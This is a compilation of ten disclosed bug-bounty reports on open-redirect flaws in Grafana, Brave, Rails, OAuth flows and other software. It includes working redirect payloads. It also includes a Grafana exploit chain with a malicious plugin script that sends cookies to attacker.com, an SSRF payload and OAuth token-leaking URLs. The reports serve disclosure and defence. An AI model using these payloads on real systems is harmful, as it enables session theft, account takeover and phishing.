# Open Redirect

_10 reports — High/Critical, disclosed_

### [CVE‑2025‑4123 — Grafana Open Redirect → Stored XSS → SSRF (Full Read) at ██████](https://hackerone.com/reports/3286945)

- **Report ID:** `3286945`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** U.S. Dept Of Defense
- **Reporter:** @khoof
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:49:56.277Z
- **CVE(s):** CVE-2025-4123, CVE-2025-3580

**Vulnerability Information:**

##  Summary

**CVE‑2025‑4123** is a high‑severity vulnerability in **Grafana OSS and Enterprise** that allows unauthenticated attackers to chain multiple flaws:

* **Open Redirect** via path traversal in the public redirect handler.
* **Stored XSS** through malicious plugin injection.
* **Full‑read SSRF** if the Grafana Image Renderer plugin is installed.

This can lead to **account takeover, data theft, and internal network compromise**.

---

## 3. Affected Products

* Grafana OSS & Enterprise **8.x through 12.x**
* **Not affected**: Grafana Cloud (managed service)
* **Vulnerable configurations**:

  * Anonymous access enabled
  * Image Renderer plugin installed
  * Outbound egress to the internet is allowed

---

## 4. CVSS Score

**CVSS v3.1:** 7.6 (High)
**Vector:** AV\:N/AC\:L/PR\:N/UI\:R/S\:U/C\:H/I\:L/A\:L

---

## 5. Technical Details

### 5.1 Root Cause

The `/public/redirect` endpoint in Grafana fails to validate and sanitize redirect targets. Combined with plugin auto‑loading from external sources, this allows loading untrusted JavaScript into the Grafana origin context.

---

### 5.2 Exploit Flow

**Step 1 — Open Redirect**
The attacker crafts a URL to the public endpoint with a path traversal pattern:

```
https://<victim-domain>/public/..%2F%5█████%2F%3f%2F..%2F..
```

Example from testing:

```
██████████
```


█████

This causes the server to redirect to `██████████` (or attacker-controlled domain).

---

**Step 2 — Host Malicious Plugin**

1. Attacker sets up a fake Grafana plugin repository with:

   * `plugin.json`
   * `malicious.js` (steals cookies, executes admin actions)
2. The victim is redirected to this plugin via the vulnerable endpoint.

---

**Step 3 — Stored XSS**

* Grafana loads the plugin and executes attacker‑supplied JavaScript in the victim’s browser under the **trusted Grafana origin**.
* This can steal:

  * Session tokens
  * API keys
  * User credentials
  * Dashboard data

---

**Step 4 — SSRF (Optional)**
If the **Image Renderer plugin** is installed:

* Attacker uses crafted image URLs pointing to internal services (e.g., `████`).
* Grafana fetches the content, sending it back to the attacker.
* This can expose **AWS credentials** or sensitive internal API data.

---

## 6. Proof of Concept (PoC)

### 6.1 Open Redirect

```
GET /public/..%2F%5█████████%2F%3f%2F..%2F.. HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0
Accept: */*
```

**Expected behavior:** Redirect to `https://███████/`

---

### 6.2 Stored XSS via Malicious Plugin

1. Create `plugin.json`:

```json
{
  "type": "panel",
  "name": "Evil Plugin",
  "id": "evil.plugin",
  "includes": [],
  "scripts": ["malicious.js"]
}
```

2. Create `malicious.js`:

```javascript
alert("XSS - Session: " + document.cookie);
// exfiltration to attacker server
fetch("https://attacker.com/log?c=" + encodeURIComponent(document.cookie));
```

3. Redirect victim to:

```
██████████
```

---

### 6.3 SSRF (Full Read)

If Image Renderer is enabled:

```json
{
  "dashboard": {
    "panels": [
      {
        "type": "image",
        "url": "█████████"
      }
    ]
  }
}
```

Renderer fetches internal metadata → credentials leaked.

---

## 7. Impact

* **Account takeover** (including admin accounts)
* **Persistent compromise** of the Grafana instance
* **Internal network access**
* **Cloud service compromise** if SSRF exploited in AWS/GCP/Azure

---

## 8. Mitigation

**Patch immediately** to:

* `10.4.18+security-01`
* `11.2.9+security-01`
* `11.3.6+security-01`
* `11.4.4+security-01`
* `11.5.4+security-01`
* `11.6.1+security-01`
* `12.0.0+security-01`

**Configuration:**

* Disable anonymous access:

```ini
[auth.anonymous]
enabled = false
```

* Restrict plugin loading to signed plugins only
* Enable strict CSP:

```ini
content_security_policy = true
```

* Remove Image Renderer if not required
* Restrict outbound egress to trusted domains only

---

## 9. Detection

Look for:

* `/public/` requests with encoded `..%2F` patterns
* Unrecognized plugin loads in logs
* Unexpected external connections from Grafana server

Example log match:

```
t=2025-08-05 lvl=info msg="Request Completed" logger=context userId=0 method=GET path=/public/..%2F
```

---

## 10. References

* [Grafana Security Advisory — CVE‑2025‑4123](https://grafana.com/blog/2025/05/23/grafana-security-release-medium-and-high-severity-security-fixes-for-cve-2025-4123-and-cve-2025-3580/)
* [NVD — CVE‑2025‑4123](████)
* [Indusface Analysis](████)
* [Ionix.io Technical Breakdown](████████)
* [Wiz.io Vulnerability DB Entry](██████)






---

**Note:**
During testing, we successfully exploited the **Open Redirect** vector using the payload:

```
███
```

The XSS and SSRF chains described above were **not fully executed** in this assessment due to the number of required setup steps and environmental constraints.
However, the confirmed open redirect behavior **validates the presence of CVE‑2025‑4123** in the target, as it is a core prerequisite for achieving the documented full‑chain exploitation.



## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers




## Suggested Mitigation/Remediation Actions

---

### [Open redirect due to scanning QR code via brave browser](https://hackerone.com/reports/1946534)

- **Report ID:** `1946534`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Brave Software
- **Reporter:** @roland_hack
- **Bounty:** - usd
- **Disclosed:** 2023-06-08T04:52:38.278Z
- **CVE(s):** CVE-2023-28364

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please fill all sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty.

## Summary:
This vulnerability was discovered in Brave's QR code scanner, which allows users to read QR codes and open corresponding links. Exploitation of this vulnerability allows attackers to direct users to malicious sites without their consent or knowledge. This vulnerability can put the security of Brave users at risk and allow them to be exposed to phishing, phishing and malware attacks. In this report, we'll describe the vulnerability in more detail, assess its severity, and provide recommendations to address it.



## Products affected: 

Brave 1.50.114, Chromium 112.0.5615.49 on Android 11; Build/RP1A.200720.011

## Steps To Reproduce:

{F2291837}

The QR code above is the one I generated to replicate the attack.
To create my QR code, I used the site https://app.qr-code-generator.com.
 I included a malicious link in this QR code. As an example link, I used www.evil.com

#  Steps To Reproduce

 -  Open the browser 
- Then in your browser you can click on the "scan a QR code" option and scan the QR code in which I have included my malicious link. 
This will automatically redirect you to the malicious site I inserted in the QR code, without even asking your opinion.
- However, some QR code scanners do not automatically redirect the user to the malicious site, but rather display the link with the "Go to site" option. Other scanners don't even show this option. 
- However, in the case of Brave, the browser automatically redirects the user to the malicious site without their consent, which poses a significant security risk to users.


## Supporting Material/References:

https://resources.infosecinstitute.com/topic/security-attacks-via-malicious-qr-codes/
https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f

## Impact

Here are some potential business impacts that this security vulnerability could have in Brave 1.50.114, Chromium 112.0.5615.49 on Android 11; Build/RP1A.200720.011:

The fact that Brave's QR code scanner opens the link without the user's notice has a big impact on user security. This vulnerability allows an attacker to redirect a Brave user to a malicious site without the user being able to see the link and make an informed decision. This can lead to exposure to malware or phishing attacks that can compromise user data.

The actual impact depends on the nature of the malicious link to which the user is redirected. In the worst case, the link may be designed to steal sensitive information, such as credit card information, credentials, or other personal information. This can lead to loss of privacy and financial damage to the user.

Moreover, if the user is redirected to a malicious site that contains malware, then it can compromise the security of the user's device and lead to loss of important data. Overall, the fact that Brave's QR code scanner automatically opens malicious links without user's notice poses a significant risk to user security and should be fixed as soon as possible.

    Increased Risk of Phishing: Exploiting this vulnerability could allow attackers to direct Brave users to malicious sites that can be used to steal sensitive information such as usernames, passwords, banking and other personal information.

    Exposure to malware: Malicious sites that users are redirected to may also contain malware that can infect Brave users' devices with malicious programs such as viruses, Trojans or ransomware.

    Privacy loss: Brave users may also be at risk of privacy loss if sensitive information is stolen as a result of the exploitation of this vulnerability.

    Loss of user trust: If Brave users fall victim to attacks as a result of exploiting this vulnerability, they may lose trust in the application and seek out more secure alternatives, which could impact reputation of the application and the company.

    Financial costs: If users fall victim to attacks as a result of this vulnerability, they may suffer financial losses, which may lead to legal action and financial costs to the company responsible for the application.

---

### [url redirection](https://hackerone.com/reports/1283200)

- **Report ID:** `1283200`
- **Severity:** Critical
- **Weakness:** Open Redirect
- **Program:** UPchieve
- **Reporter:** @ben_lay
- **Bounty:** - usd
- **Disclosed:** 2021-07-30T14:33:20.075Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[the following url is vulnerable to redirect]

https://app.upchieve.org

## Steps To Reproduce:
when you add @evil.com the user will be directed to evil.com
https://app.upchieve.org@evil.com

## Impact

Users could get redirected to malicious domain

---

### [Bypass the fix of report #1078283 due to poor validation](https://hackerone.com/reports/1212337)

- **Report ID:** `1212337`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Khan Academy
- **Reporter:** @wlucenasec
- **Bounty:** - usd
- **Disclosed:** 2021-07-08T19:25:27.515Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Khan Academy Team,

I was able to bypass the fix you implemented for report #1078283. 

The URL validation you implemented on the endpoint `continue` checks the presence of `khanacademy.org` however it doesn't have any boundary checking to ignore domains starting with `.org`, so if an attacker register a domain starting with `org` like this one `orghacker.com.br` and have a subdomain entry of `khanacademy` the attacker is able to bypass the current implementation and lead the victim to his controlled page.

# Steps to reproduce the issue

* Go to this page https://www.khanacademy.org/signup?isteacher=1&referral=LearnStorm&continue=https://khanacademy.orghacker.com.br
* You'll be redirected to `orghacker.com.br` which is not a domain that Khan Academy owns

## Impact

Bypass of current URL validation. Attacker can send a phishing campaign and redirect the request to a server of his control. An attacker might chain the attack to other types of attack too.

---

### [Open Redirect (6.0.0 < rails < 6.0.3.2)](https://hackerone.com/reports/904059)

- **Report ID:** `904059`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Ruby on Rails
- **Reporter:** @ooooooo_q
- **Bounty:** 1000 usd
- **Disclosed:** 2020-12-22T16:47:02.435Z
- **CVE(s):** CVE-2020-8264, CVE-2020-8185

**Vulnerability Information:**

Hello,
I was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.

https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21

```ruby
  redirect_to request.params[:location]
end

private
  def actionable_request?(request)
    request.show_exceptions? && request.post? && request.path == endpoint
  end

  def redirect_to(location)
    body = "<html><body>You are being <a href=\"#{ERB::Util.unwrapped_html_escape(location)}\">redirected</a>.</body></html>"

    [302, {
      "Content-Type" => "text/html; charset=#{Response.default_charset}",
      "Content-Length" => body.bytesize.to_s,
      "Location" => location,
    }, [body]]
  end
```

There was an open redirect issue because the request parameter `location` was not validated.
In 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.


### PoC


#### 1. Prepare server

Prepare an attackable 6.0.3.1 version of Rails server

```
❯ rails -v
Rails 6.0.3.1

❯ RAILS_ENV=production rails s
...
* Environment: production
* Listening on tcp://0.0.0.0:3000
```

#### 2. Attack server 

Prepare the server for attack on another port.

```html
<form method="post" action="http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/">
	<button type="submit">click!</button>
</form>
````

```
python3 -m http.server 8000
```

#### 3. Open browser

Open the `http://localhost:8000/attack.html` url in your browser and click the button.
Redirect to `https://www.hackerone.com/` url.

{F876518}

## Impact

It will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.

This open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.

---

### [Stealing Users OAuth Tokens through redirect_uri parameter](https://hackerone.com/reports/665651)

- **Report ID:** `665651`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** GSA Bounty
- **Reporter:** @manshum12
- **Bounty:** 750 usd
- **Disclosed:** 2019-10-01T18:25:11.364Z
- **CVE(s):** -

**Vulnerability Information:**

I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

Step : 
1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .

## Impact

Attacker can using this bug to stolen victim access token , that means he can takeover victim account .

---

### [url-parse package return wrong hostname ](https://hackerone.com/reports/384029)

- **Report ID:** `384029`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Node.js third-party modules
- **Reporter:** @leetboi
- **Bounty:** - usd
- **Disclosed:** 2018-07-30T08:57:13.676Z
- **CVE(s):** CVE-2018-3774

**Summary (team):**

Jul 19th 2018 -  lolwaleet submitted a report to Node.js third-party modules.
I would like to report url-parse package return wrong hostname in url-parse.

# Module
module name: url-parse
version: 1.4.1
npm page: https://www.npmjs.com/package/url-parse

## Module Description
The url-parse method exposes two different API interfaces. The url interface that you know from Node.js and the new URL interface that is available in the latest browsers.

In version 0.1 we moved from a DOM based parsing solution, using the <a> element, to a full Regular Expression solution. The main reason for this was to make the URL parser available in different JavaScript environments as you don't always have access to the DOM. An example of such environment is the Worker interface. The RegExp based solution didn't work well as it required a lot of lookups causing major problems in FireFox. In version 1.0.0 we ditched the RegExp based solution in favor of a pure string parsing solution which chops up the URL into smaller pieces. This module still has a really small footprint as it has been designed to be used on the client side.

# Vulnerability
## Vulnerability Description
url-parse returns wrong hostname which leads to multiple vulnerabilities such as SSRF, Open Redirect, Bypass Authentication Protocol.

# Fix
Fixes applied to version 1.4.3
## Resources:
* Patch landed in master, including tests to prevent regression: https://github.com/unshiftio/url-parse/commit/53b1794e54d0711ceb52505e0f74145270570d5a
* A SECURITY.md file has been added to the repo to make it easier to report bugs, and reach me in the future, including history of the previous security reports and their fix version. https://github.com/unshiftio/url-parse/commit/d7b582ec1243e8024e60ac0b62d2569c939ef5de
* http://0xahmed.ninja/

---

### [Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking the token)](https://hackerone.com/reports/292825)

- **Report ID:** `292825`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Ed
- **Reporter:** @jackds
- **Bounty:** - usd
- **Disclosed:** 2017-11-25T16:11:16.855Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary
To comment on an article a user has the option to login using his Github account. After logging in the user is normally redirect back to the URL he came from. I found out that it is also possible to redirect to a non-existing subdomain of edoverflow.com. It looks like the whitelist for the OAuth flow is not configured properly.

# Vulnerability Details
For logging in using the OAuth login flow the following URL is used: https://github.com/login/oauth/authorize?client_id=5f45cc999f7812d0b6d2&redirect_uri={url}&scope=public_repo . The redirect_uri parameter is matched against the configured URLs in the OAuth Application settings. I'm not sure how this is configured for this app, but it seems possible to redirect to a subdomain as well.

# Steps To Reproduce:

  1. Go to https://github.com/login/oauth/authorize?client_id=5f45cc999f7812d0b6d2&redirect_uri=https%3A%2F%2Fnonexisting.edoverflow.com&scope=public_repo
  2. Login using your Github account
  3. You are now redirected to nonexisting.edoverflow.com?code={code}

# Impact
Impact is limited as it is still only possible to redirect to a subdomain. In order to carry out an attack the attackers needs to find a vulnerable subdomain first. 

# Supporting Material/References
-

## Impact

If the target URL is vulnerable in any way the attacker might be able to actually steal a login-token.

---

### [Identity Login Page Redirect Can Be Manipulated](https://hackerone.com/reports/243474)

- **Report ID:** `243474`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Inflection
- **Reporter:** @malcolmx
- **Bounty:** - usd
- **Disclosed:** 2017-10-13T16:15:29.880Z
- **CVE(s):** -

**Summary (team):**

The Identity.com login page could be manipulated to redirect the user to an arbitrary URL after a successful authentication.

# Researcher POC

* I used this request to try login https://www.identity.com/signin?redirect_url=%2Foauth%2Fauthorize%3Fclient_id%3D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%26redirect_uri%3D%252Ftest-callback%26response_type%3Dcode%26scope%3Dname%2Bemail%2Bdob%26state%3DAPPLICATION_TEST
* I put %40google.com after redirect_url= so the endpoint was like this &redirect_url=%40google.com%2Fclient_id%253D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%2526redirect_uri%253D%25252Ftest-callback%2526response_type%253Dcode%2526scope%253Dname%252Bemail%252Bdob%2526state%253DAPPLICATION_TEST
* After a successfully login i redirect to google.com

---

### [Open Redirect in <customer>.greenhouse.io](https://hackerone.com/reports/203726)

- **Report ID:** `203726`
- **Severity:** High
- **Weakness:** Open Redirect
- **Program:** Greenhouse.io
- **Reporter:** @cyneox
- **Bounty:** - usd
- **Disclosed:** 2017-07-08T09:12:59.363Z
- **CVE(s):** -

**Vulnerability Information:**

## Open Redirect in scout24.greenhouse.io

The **Scout24 Security Team** did a penetration test against `scout24.greenhouse.io` in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) using industry common metholodogies. 

## Reproduction steps

* Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed [this one](https://boards.greenhouse.io/scout24/jobs/503488))
* After completing your personal information, you can *upload* some documents
	* Click `Attach` both under *Resume/CV* and *Cover Letter*
	* Upload some PDF files from your local host (in my case the file uwas called `neu.pdf`)
* In the end you send your application by clicking on `Submit Application`

Using a HTTP proxy (in my case that was [Burp](https://portswigger.net/burp/)) I was able to intercept the `POST` request made by the browser before being sent to the `greenhouse.io` API. This is some sample request:

### Proof-of-Concept (PoC)

```.http
POST /scout24/jobs/503488 HTTP/1.1
Host: boards.greenhouse.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
X-Requested-With: XMLHttpRequest
Referer: https://boards.greenhouse.io/scout24/jobs/503488
Content-Length: 4086
Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
Connection: close

[...]
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url]"

https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902660983-1663bnwl7dt-b044057e6364840cde6c41d55de3a1e1%2Fneu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url]"

https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902672335-lpk5xur1na-67346266367805828242f31b3887e539%2Fneu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861--
```

As you can notice the files have been already uploaded to `AWS` and therfore a S3 bucket links are 
used within the requests. 

## Exploitability

Using a browser and a HTTP proxy the request can be easily intercepted. In the **original** request the `Content-Disposition` parameter `job_application[cover_letter_url]` in the `POST` request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:

* a phishing site
* a site containing some malware

After intercepting the request, the parameter was modified like this:

```.http
POST /scout24/jobs/503488 HTTP/1.1
Host: boards.greenhouse.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
X-Requested-With: XMLHttpRequest
Referer: https://boards.greenhouse.io/scout24/jobs/503488
Content-Length: 4086
Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
Connection: close
[...]

-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url]"

https://google.com
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[resume_url_filename]"

neu.pdf
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url]"

http://google.com
-----------------------------844282227400113298508475861
Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"
```

Whenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to **download** the file by clicking on `Download` (left upper corner). Although the browser shows that the URL points to some specific `AWS` domain, the content is actually loaded from somewhere else (in this case from [https://google.com](https://google.com)). 

Again, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like [https://google.com](https://google.com) has been chosen. 

## Impact

The attack can be conducted in multiple scenarios:

* anonymous person applies for some jobs and manipulates the parameters (like described above)
* internal employee adds referal for some person and also manipulates the parameters

In both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:

* installation of trojan horses / ransomeware (in general malicious content)
* a phishing site where e.g. AD credentials are claimed to be required
* CSRF (Cross-Site Request Forgery) [attacks](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))

## Remediation

The affected parameter should be first validated against some regular expression (e.g. allow only links that point to `grnhse-prod-jben-*.s3.amazonaws.com`).

---
